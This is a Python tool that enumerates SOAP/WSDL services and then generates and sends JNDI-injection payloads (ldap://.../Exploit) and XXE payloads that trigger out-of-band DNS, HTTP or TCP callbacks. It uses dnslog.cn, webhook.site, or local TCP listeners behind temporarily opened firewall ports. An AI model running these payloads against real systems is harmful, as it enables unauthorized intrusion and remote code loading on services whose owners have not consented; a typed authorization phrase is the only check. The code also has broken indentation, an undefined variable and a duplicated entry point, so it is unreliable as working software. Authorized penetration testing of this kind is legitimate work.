#!/usr/bin/env python3

import argparse
import os
import socket
import subprocess
import threading
import time
from http import client
from pathlib import Path
from typing import Dict, List

import requests
from zeep import Client, Settings
from zeep.plugins import HistoryPlugin
from zeep.transports import Transport

COMMON_PORTS = [1389, 8080, 8443, 80, 443, 53, 123, 587, 3306, 5000, 7001, 9999]

def start_multiple_tcp_listeners(bind_ip: str, ports: list, timeout: int = 30):
    """Start TCP listeners on multiple ports concurrently. Returns dict with results."""
    results = {}
    threads = []

    def listener_worker(port):
        result = {"port": port, "accepted": False, "peer": None, "error": None}
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["accepted"] = True
                    result["peer"] = addr
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    conn.close()
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)
        results[port] = result

    for p in ports:
        t = threading.Thread(target=listener_worker, args=(p,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout + 2)

    return results

# ---- Config / Suspicious items to look for ----
SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
SUSPICIOUS_FIELD_KEYWORDS = [
    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
    "customwriter", "msgSource"
]

# ---- Utility functions ----
def get_local_ip() -> str:
    """Return the primary local IP address used to reach the internet (best-effort)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # connect to a public DNS IP, doesn't send packets
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def ensure_ufw_port_allowed(port: int) -> bool:
    try:
        r = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True)
        output = r.stdout.lower()
        if f"{port}" in output and "allow" in output:
            return True
        # Add rule
        subprocess.run(["sudo", "ufw", "allow", f"{port}/tcp"], check=True)
        return True
    except Exception as e:
        print(f"[!] Could not verify/add ufw rule for port {port}: {e}")
        return False

def cleanup_ufw_ports(ports: List[int]):
    for port in ports:
        try:
            subprocess.run(["sudo", "ufw", "delete", "allow", f"{port}/tcp"], check=True)
            print(f"[+] Removed ufw rule for port {port}")
        except Exception:
            pass

def check_ufw_status() -> str:
    """Try to run 'sudo ufw status' to show firewall settings (requires sudo)."""
    try:
        p = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=10)
        return p.stdout.strip() if p.returncode == 0 else f"ufw returned code {p.returncode}: {p.stdout.strip()} {p.stderr.strip()}"
    except Exception as e:
        return f"ufw check failed: {e}"

def save_payload(filename: Path, xml: str):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(xml, encoding="utf-8")
    print(f"[+] Wrote payload: {filename}")

# ---- Zeep client loader with simple timeout handling ----
def load_wsdl(wsdl_url: str, timeout=15, verify=True):
    session = requests.Session()
    session.verify = verify
    transport = Transport(session=session, timeout=timeout)
    settings = Settings(strict=False, xml_huge_tree=True)
    history = HistoryPlugin()
    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
    return client, history

# ---- Recon & payload generation ----
def recon_wsdl(wsdl_url: str):
    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
    client, history = load_wsdl(wsdl_url)
    services = {}
    suspicious_fields = set()
    encoded_style = False

    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
    try:
        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
            encoded_style = True
    except Exception:
        raw = None

    for sname, serv in client.wsdl.services.items():
        services[sname] = {}
        for pname, port in serv.ports.items():
            ops = list(port.binding._operations.keys())
            services[sname][pname] = {
                "address": port.binding_options.get("address"),
                "binding": str(port.binding.name),
                "operations": ops
            }

    # attempt to discover suspicious element/field names via client.wsdl.types
    try:
        schema = client.wsdl.types
        # elements: try both .elements and generator/list forms
        elems = []
        if hasattr(schema, "elements"):
            try:
                if hasattr(schema.elements, "items"):
                    elems = [k for k, v in schema.elements.items()]
                else:
                    elems = list(schema.elements)
            except Exception:
                elems = []
        for e in elems:
            name = getattr(e, "localname", str(e)).lower() if hasattr(e, "localname") or isinstance(e, tuple) else str(e).lower()
            for kw in SUSPICIOUS_FIELD_KEYWORDS:
                if kw.lower() in name:
                    suspicious_fields.add(name)
    except Exception:
        # fallback: nothing
        pass

    return {
        "services": services,
        "suspicious_fields": sorted(suspicious_fields),
        "encoded_style": encoded_style
    }

def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, target_port: int, namespace="http://source.trax.aero"):
    root_tag = operation
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{target_ip}:{target_port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def build_jndi_dns_probe_xml(service_name: str, operation: str, dns_domain: str, port: int = 389, namespace="http://source.trax.aero"):
    """Generate JNDI payload that triggers DNS lookup"""
    unique_id = operation.lower().replace('_', '-')
    root_tag = operation
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://jndi-{unique_id}.{dns_domain}:{port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def build_xxe_dns_probe_xml(operation: str, dns_domain: str, namespace="http://source.trax.aero"):
    """Generate XXE payload that triggers DNS lookup"""
    unique_id = operation.lower().replace('_', '-')
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-{unique_id}.{dns_domain}/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{operation}>&xxe;</ns:{operation}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def get_dns_callback_service():
    """Try multiple DNS callback services and return the first working one"""

    # Try dnslog.cn
    print("[*] Trying dnslog.cn for DNS monitoring...")
    try:
        r = requests.get('http://www.dnslog.cn/getdomain.php', timeout=10)
        if r.status_code == 200:
            domain = r.text.strip()
            if domain and '.' in domain:
                print(f"[+] Got dnslog.cn domain: {domain}")
                print(f"[*] Check callbacks at: http://www.dnslog.cn/")
                return {'domain': domain, 'service': 'dnslog.cn', 'check_url': 'http://www.dnslog.cn/'}
    except Exception as e:
        print(f"[!] dnslog.cn failed: {e}")

    # Try webhook.site
    print("[*] Trying webhook.site...")
    try:
        r = requests.post('https://webhook.site/token', timeout=10, json={})
        if r.status_code == 201:
            data = r.json()
            uuid = data.get('uuid')
            if uuid:
                domain = f"{uuid}.webhook.site"
                print(f"[+] Got webhook.site domain: {domain}")
                print(f"[*] Check callbacks at: https://webhook.site/#!/{uuid}")
                return {'domain': domain, 'service': 'webhook.site', 'check_url': f'https://webhook.site/#!/{uuid}'}
    except Exception as e:
        print(f"[!] webhook.site failed: {e}")

    print("[!] All automatic DNS services failed")
    print("[*] Please use --dns-callback with your own service:")
    print("    - Burp Collaborator: YOUR_ID.burpcollaborator.net")
    print("    - dnslog.cn: Visit http://dnslog.cn/ manually")
    print("    - canarytokens.org: Visit http://canarytokens.org/generate")
    return None

def poll_dns_callbacks(service_info):
    """Poll DNS callback service for results"""
    service = service_info.get('service')
    domain = service_info.get('domain')

    if service == 'dnslog.cn':
        try:
            print(f"\n[*] Checking dnslog.cn for DNS callbacks...")
            r = requests.get('http://www.dnslog.cn/getrecords.php', timeout=10)

            if r.status_code == 200:
                records = r.json()

                if records:
                    print(f"\n{'='*80}")
                    print(f"[!!!] DNS CALLBACKS RECEIVED: {len(records)}")
                    print(f"{'='*80}")

                    for record in records:
                        print(f"\n[!!!] DNS Query Detected!")
                        print(f"      Subdomain: {record.get('subdomain', 'unknown')}")
                        print(f"      Type: {record.get('type', 'unknown')}")
                        print(f"      Time: {record.get('time', 'unknown')}")

                    return records
                else:
                    print("[*] No callbacks received yet")
                    return []
        except Exception as e:
            print(f"[!] Error polling dnslog.cn: {e}")
            return []

    elif service == 'webhook.site':
        try:
            uuid = domain.split('.')[0]
            print(f"\n[*] Checking webhook.site for callbacks...")
            r = requests.get(f'https://webhook.site/token/{uuid}/requests', timeout=10)

            if r.status_code == 200:
                requests_data = r.json()

                if requests_data:
                    print(f"\n{'='*80}")
                    print(f"[!!!] HTTP CALLBACKS RECEIVED: {len(requests_data)}")
                    print(f"{'='*80}")

                    for req in requests_data[:5]:  # Show first 5
                        print(f"\n[!!!] HTTP Request Detected!")
                        print(f"      Method: {req.get('method', 'unknown')}")
                        print(f"      IP: {req.get('ip', 'unknown')}")
                        print(f"      User-Agent: {req.get('user_agent', 'unknown')}")
                        print(f"      Time: {req.get('created_at', 'unknown')}")

                    return requests_data
                else:
                    print("[*] No callbacks received yet")
                    return []
        except Exception as e:
            print(f"[!] Error polling webhook.site: {e}")
            return []

    else:
        print(f"[*] Manual checking required for {domain}")
        print(f"[*] Visit: {service_info.get('check_url', 'unknown')}")
        return []

# ---- Active network functions ----
def start_tcp_listener(bind_ip: str, bind_port: int, timeout: int = 30):

    result = {"conn": None, "peer": None, "accepted": False}

    def _listener():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, bind_port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["conn"] = conn
                    result["peer"] = addr
                    result["accepted"] = True
                    # try to read small amount then close
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)

    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return t, result

def send_soap_payload(url: str, xml: str, timeout=15, verify=True):

    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '""'
    }
    try:
        r = requests.post(url, data=xml.encode("utf-8"), headers=headers, timeout=timeout, verify=verify)
        status = r.status_code
        body = r.text[:2000]

        if "Fault" in body or status >= 400:
            verdict = "Rejected by Service (SOAP Fault or HTTP error)"
        elif 200 <= status < 300:
            verdict = "Possibly Accepted / Executed"
        else:
            verdict = "Unknown or Unhandled HTTP Status"

        return {
            "status_code": status,
            "text": body,
            "headers": dict(r.headers),
            "verdict": verdict
        }

    except Exception as e:
        return {
            "error": str(e),
            "verdict": "Dropped or No Response"
        }

def main():
    ap = argparse.ArgumentParser(description="Automate WSDL recon and JNDI/XXE probe with DNS or TCP callbacks")
    ap.add_argument("--wsdl", required=True, help="WSDL URL")
    ap.add_argument("--outdir", default="payloads", help="Directory to write payload XML files")
    ap.add_argument("--exploit", action="store_true", help="Enable active exploit/probe sending (requires interactive confirmation)")
    ap.add_argument("--recon", action="store_true", help="Recon-only mode: assess potential risk without sending traffic")

    # Callback methods
    ap.add_argument("--dns-callback", help="Use DNS callbacks (provide domain like: abc123.interact.sh or abc123.burpcollaborator.net)")
    ap.add_argument("--use-interactsh", action="store_true", help="Auto-register with interact.sh for DNS monitoring (RECOMMENDED)")
    ap.add_argument("--listener", action="store_true", help="Start TCP listeners on COMMON_PORTS to detect callbacks (only if not using DNS)")
    ap.add_argument("--listen-ip", default=None, help="IP to bind TCP listener to (defaults to auto-detected)")

    ap.add_argument("--timeout", type=int, default=30, help="Listener timeout seconds")
    ap.add_argument("--no-verify-tls", action="store_true", help="Do not verify TLS when sending SOAP requests")
    args = ap.parse_args()

    wsdl = args.wsdl
    outdir = Path(args.outdir)
    verify_tls = not args.no_verify_tls

    print(f"[+] Reconnaissance: parsing WSDL {wsdl}")
    recon = recon_wsdl(wsdl)
    services = recon["services"]
    print(f"[+] Found services: {list(services.keys())}")
    for sname, ports in services.items():
        for pname, pinfo in ports.items():
            print(f"  - Service: {sname} / Port: {pname}")
            print(f"    Address: {pinfo.get('address')}")
            print(f"    Operations: {pinfo.get('operations')}")

    if recon["suspicious_fields"]:
        print(f"[!] Suspicious fields discovered: {recon['suspicious_fields']}")
    if recon["encoded_style"]:
        print("[!] WSDL indicates encoded/RPC style usage (higher risk)")

    # Determine callback method
    dns_callback = None
    interactsh_data = None
    use_tcp = False

    if args.use_interactsh:
            dns_service_data = get_dns_callback_service()
            if dns_service_data:
                dns_callback = dns_service_data['domain']
            else:
                print("[!] Failed to get automatic DNS callback service")
                return
    elif args.dns_callback:
        dns_callback = args.dns_callback
        print(f"[*] Using DNS callbacks to: {dns_callback}")
    elif args.listener:
        use_tcp = True
        local_ip = args.listen_ip if args.listen_ip else get_local_ip()
        print(f"[+] Using TCP callbacks to: {local_ip}")
    else:
        print("[!] Must specify callback method:")
        print("  --use-interactsh (recommended)")
        print("  --dns-callback DOMAIN")
        print("  --listener (TCP callbacks)")
        return

    if args.recon:
        if recon["encoded_style"] or recon["suspicious_fields"]:
            print("\n[+] Recon-only mode active. Target WSDL appears POTENTIALLY VULNERABLE due to:")
            if recon["encoded_style"]:
                print("  - Use of SOAP encoded style (RPC/encoded)")
            if recon["suspicious_fields"]:
                print("  - Field names matching sensitive or JNDI-related patterns")
        else:
            print("\n[+] Recon-only mode active. No immediate signs of unsafe operations")
        return

    outdir.mkdir(parents=True, exist_ok=True)
    generated = []

    for sname, ports in services.items():
        safe_sname = sname.replace(" ", "_").replace("/", "_")
        for pname, pinfo in ports.items():
            for op in pinfo.get("operations", []):
                lower = op.lower()
                is_interesting = any(k in lower for k in SUSPICIOUS_OP_KEYWORDS) or "jms" in lower or "flatfile" in lower or "timer" in lower
                if not is_interesting:
                    continue

                if dns_callback:
                    # Generate DNS callback payloads
                    # JNDI with DNS
                    xml_jndi = build_jndi_dns_probe_xml(safe_sname, op, dns_callback)
                    fname_jndi = outdir / f"{safe_sname}_{op}_jndi_dns.xml"
                    save_payload(fname_jndi, xml_jndi)
                    generated.append(("JNDI-DNS", op, fname_jndi, pinfo.get("address")))

                    # XXE with DNS
                    xml_xxe = build_xxe_dns_probe_xml(op, dns_callback)
                    fname_xxe = outdir / f"{safe_sname}_{op}_xxe_dns.xml"
                    save_payload(fname_xxe, xml_xxe)
                    generated.append(("XXE-DNS", op, fname_xxe, pinfo.get("address")))

                else:
                    # Generate TCP callback payloads (original behavior)
                    for port in COMMON_PORTS:
                        xml = build_jndi_probe_xml(safe_sname, op, local_ip, port)
                        fname = outdir / f"{safe_sname}_{op}_port{port}.xml"
                        save_payload(fname, xml)
                        generated.append(("JNDI-TCP", op, fname, pinfo.get("address")))

    if not generated:
        print("[+] No interesting operations found. Exiting.")
        return

    print(f"[+] Generated {len(generated)} probe payload(s) in {outdir}")

    if not args.exploit:
        print("[+] Dry-run complete. Use --exploit to run active probes (requires confirmation).")
        return

    auth_phrase = "I HAVE AUTHORIZATION"
    print("\n*** ACTIVE MODE ENABLED ***")
    print("You must have explicit written authorization to run active probes.")
    resp = input(f"Type the authorization phrase exactly to proceed: [{auth_phrase}]\n> ").strip()
    if resp != auth_phrase:
        print("[!] Authorization phrase mismatch. Aborting active probes.")
        return

    # Start TCP listeners if using TCP mode
    listener_results = None
    open_ports = []

    if use_tcp:
        print("[*] Checking ufw status (may prompt for sudo)...")
        ufw = check_ufw_status()
        print("[*] ufw status / output:")
        print(ufw)

        for p in COMMON_PORTS:
            if ensure_ufw_port_allowed(p):
                open_ports.append(p)

        print(f"[+] Starting listeners on ports: {COMMON_PORTS}")
        listener_results = start_multiple_tcp_listeners(local_ip, COMMON_PORTS, timeout=args.timeout)
        time.sleep(1)

    final_report = []

    # Send all payloads
    for payload_type, op, fname, address in generated:
        xml = fname.read_text(encoding="utf-8")
        target_url = address if address else wsdl
        print(f"[+] Sending {payload_type} probe for op {op} to {target_url} (payload {fname.name})")
        r = send_soap_payload(target_url, xml, verify=verify_tls)
        verdict = r.get("verdict", "No verdict")
        print(f"    [{verdict}] - Status: {r.get('status_code', r.get('error'))}")
        if "text" in r:
            print("    Body (truncated):", r["text"][:300].replace("\n", " "))
        final_report.append({
            "operation": op,
            "type": payload_type,
            "target": target_url,
            "payload": str(fname),
            "verdict": verdict,
            "status": r.get("status_code", r.get("error"))
        })

    # Check for callbacks
    if dns_callback:
        # DNS mode - poll interact.sh
        print(f"\n[*] Waiting 5 seconds for DNS propagation...")
        time.sleep(5)

        if dns_service_data:
                    interactions = poll_dns_callbacks(dns_service_data)

            if interactions:
                print(f"\n[!!!] SUCCESS - Received {len(interactions)} callbacks!")
                print(f"[!!!] Target is VULNERABLE to out-of-band attacks!")
                for interaction in interactions:
                    final_report.append({
                        "callback_type": interaction.get('protocol'),
                        "callback_received": True,
                        "from_ip": interaction.get('remote-address'),
                        "subdomain": interaction.get('full-id')
                    })
            else:
                print("\n[*] No DNS callbacks received yet")
                print("[*] Check later at: https://app.interact.sh/")
        else:
            print(f"\n[*] Manual DNS monitoring required for: {dns_callback}")
            print(f"[*] Check your DNS logger for lookups to subdomains of {dns_callback}")

    elif use_tcp:
        # TCP mode - check listener results
        print("\n=== Listener Summary ===")
        for port, result in listener_results.items():
            if result["accepted"]:
                print(f"[!!!] Port {port}: CONNECTION from {result['peer']}")
                final_report.append({
                    "listener_port": port,
                    "callback_received": True,
                    "peer": result['peer']
                })
            else:
                print(f"[-] Port {port}: No connection")
                final_report.append({
                    "listener_port": port,
                    "callback_received": False
                })

        cleanup_ufw_ports(open_ports)

    print("\n=== Summary Report ===")
    for item in final_report:
        print(item)

    print("\nDone.")

if __name__ == "__main__":
    main()

if __name__ == "__main__":
    main()
